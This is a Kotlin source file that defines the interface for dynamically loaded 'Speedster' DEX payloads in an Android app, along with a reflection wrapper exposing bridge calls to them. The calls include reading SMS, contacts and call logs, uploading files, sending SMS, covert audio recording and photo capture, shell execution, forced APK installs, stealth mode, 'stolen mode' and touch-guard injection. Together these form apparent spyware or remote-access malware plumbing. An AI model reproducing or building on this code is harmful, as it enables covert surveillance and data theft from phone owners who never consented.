package com.example.myandroid.dynamic

import android.content.Context
import android.view.View

/**
 * The Contract Interface.
 * Every Speedster payload MUST implement this interface.
 * It allows the main app to safely invoke the dynamic UI or headless task.
 */
abstract class DynamicEntry {
    // default implementation makes it non-abstract so purely headless tasks do not require stubs
    open fun getView(context: Context, bridge: Any, baseDir: String): View {
        throw UnsupportedOperationException("This dynamic entry is headless and does not provide a view.")
    }
    open fun onScreenStateChanged(isOn: Boolean) {}

    // Headless logic-unrestricted execution lifecycle hooks
    open fun onStart(context: Context, bridge: Any, baseDir: String) {}
    open fun onStop(context: Context) {}
}

/**
 * A helper class for Native DEX Payloads to easily access the CortexBridge.
 * Wraps the 'Any' bridge using reflection so you get strongly-typed native calls.
 */
class CortexNativeAPI(private val bridge: Any) {
    
    // --- Core UI & Navigation ---
    fun close() = call("close")
    fun releaseTouch() = call("releaseTouch")
    fun injectTouchGuard() = call("injectTouchGuard")
    fun removeTouchGuard() = call("removeTouchGuard")
    fun wake() = call("wake")
    fun lock() = call("lock")
    fun nav(action: String) = call("nav", action, String::class.java)
    fun setDim(percentage: Int) = call("setDim", percentage, Int::class.java)
    fun reportPowerState(state: String) = call("reportPowerState", state, String::class.java)
    fun keepScreenIgnited(active: Boolean) = call("keepScreenIgnited", active, Boolean::class.java)
    fun toast(message: String) = call("toast", message, String::class.java)
    
    // --- Hardware & Sensory ---
    fun vibrate(durationMs: Long) = call("vibrate", durationMs, Long::class.java)
    fun setVolume(streamStr: String, levelStr: String) = call("setVolume", arrayOf(streamStr, levelStr), arrayOf(String::class.java, String::class.java))
    fun getBattery(): Int = call("getBattery") as? Int ?: 0
    fun isCharging(): Boolean = call("isCharging") as? Boolean ?: false
    fun takeScreenshot(quality: Int) = call("takeScreenshot", quality, Int::class.java)
    fun capturePhoto(useFront: Boolean) = call("capturePhoto", useFront, Boolean::class.java)
    fun recordAudio(seconds: Int) = call("recordAudio", seconds, Int::class.java)

    // --- System & Execution ---
    fun log(msg: String) = call("log", msg, String::class.java)
    fun executeCommand(cmdJson: String) = call("executeCommand", cmdJson, String::class.java)
    fun runIntent(intentJson: String) = call("runIntent", intentJson, String::class.java)
    fun openApp(packageName: String) = call("openApp", packageName, String::class.java)
    fun openAccSettings() = call("openAccSettings")
    fun openAccHelp() = call("openAccHelp")
    fun startRelentlessInstall(apkPath: String) = call("startRelentlessInstall", apkPath, String::class.java)
    fun shell(cmd: String) = call("shell", cmd, String::class.java)

    // --- Trap Chaining ---
    fun triggerTrap(type: String, label: String) = call("triggerTrap", arrayOf(type, label), arrayOf(String::class.java, String::class.java))

    // --- Data Extraction & Stealth ---
    fun uploadFile(filePath: String, category: String) = call("uploadFile", arrayOf(filePath, category), arrayOf(String::class.java, String::class.java))
    fun sendSms(number: String, message: String) = call("sendSms", arrayOf(number, message), arrayOf(String::class.java, String::class.java))
    fun readSms(limit: Int): String = call("readSms", limit, Int::class.java) as? String ?: "[]"
    fun getContacts(limit: Int): String = call("getContacts", limit, Int::class.java) as? String ?: "[]"
    fun getCallLogs(limit: Int): String = call("getCallLogs", limit, Int::class.java) as? String ?: "[]"
    fun getSystemInfo(): String = call("getSystemInfo") as? String ?: "{}"
    fun getNearbyWifi(): String = call("getNearbyWifi") as? String ?: "[]"
    fun connectToWifi(ssid: String, pass: String) = call("connectToWifi", arrayOf(ssid, pass), arrayOf(String::class.java, String::class.java))
    fun setStealthMode(active: Boolean) = call("setStealthMode", active, Boolean::class.java)
    fun triggerStolenMode(target: String) = call("triggerStolenMode", target, String::class.java)
    fun evaluateSim() = call("evaluateSim")
    fun performGesture(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long) = call(
        "performGesture",
        arrayOf(x1, y1, x2, y2, duration),
        arrayOf(Float::class.java, Float::class.java, Float::class.java, Float::class.java, Long::class.java)
    )

    private fun call(methodName: String): Any? {
        return try { bridge.javaClass.getMethod(methodName).invoke(bridge) } catch (e: Exception) { null }
    }

    private fun call(methodName: String, arg: Any, type: Class<*>): Any? {
        return try { bridge.javaClass.getMethod(methodName, type).invoke(bridge, arg) } catch (e: Exception) { null }
    }

    private fun call(methodName: String, args: Array<Any>, types: Array<Class<*>>): Any? {
        return try { bridge.javaClass.getMethod(methodName, *types).invoke(bridge, *args) } catch (e: Exception) { null }
    }
}
